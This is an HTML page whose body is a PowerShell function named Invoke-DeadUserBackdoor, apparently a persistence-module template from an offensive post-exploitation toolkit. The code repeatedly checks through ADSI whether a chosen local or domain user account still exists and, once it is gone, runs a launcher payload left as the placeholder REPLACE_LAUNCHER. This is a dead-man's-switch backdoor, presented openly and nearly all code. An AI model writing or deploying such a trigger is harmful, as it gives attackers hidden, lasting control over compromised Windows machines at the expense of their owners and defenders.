<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>DeadUser</title>
</head><body>function Invoke-DeadUserBackdoor<br/>
{<br/>
&nbsp; &nbsp; Param( &nbsp;<br/>
&nbsp; &nbsp; [Parameter(Mandatory=$False,Position=1)]<br/>
&nbsp; &nbsp; [int]$Timeout=0,<br/>
&nbsp; &nbsp; [Parameter(Mandatory=$False,Position=2)]<br/>
&nbsp; &nbsp; [int] $Sleep=30,<br/>
&nbsp; &nbsp; [Parameter(Mandatory=$True,Position=3)]<br/>
&nbsp; &nbsp; [string] $Username,<br/>
&nbsp; &nbsp; [Parameter(Mandatory=$False,Position=4)]<br/>
&nbsp; &nbsp; [switch] $Domain<br/>
&nbsp; &nbsp; )<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; $running=$True<br/>
&nbsp; &nbsp; $match =""<br/>
&nbsp; &nbsp; $starttime = Get-Date<br/>
&nbsp; &nbsp; while($running)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $running=$False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; } &nbsp; &nbsp; &nbsp; &nbsp;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if($Domain)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $UserSearcher = [adsisearcher]"(&amp;(samAccountType=805306368)(samAccountName=*$UserName*))"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $UserSearcher.PageSize = 1000<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $count = @($UserSearcher.FindAll()).Count<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if($count -eq 0)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Domain user $Username not found!"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $match=$True<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $comp = $env:computername<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [ADSI]$server="WinNT://$comp"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $usercheck = $server.children | where{$_.schemaclassname -eq "user" -and $_.name -eq $Username}<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(-not $usercheck)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $match=$True<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if($match)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; REPLACE_LAUNCHER<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $running=$False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Start-Sleep -s $Sleep<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; } &nbsp; <br/>
}<br/>
Invoke-DeadUserBackdoor"""<br/>
<br/>
</body></html>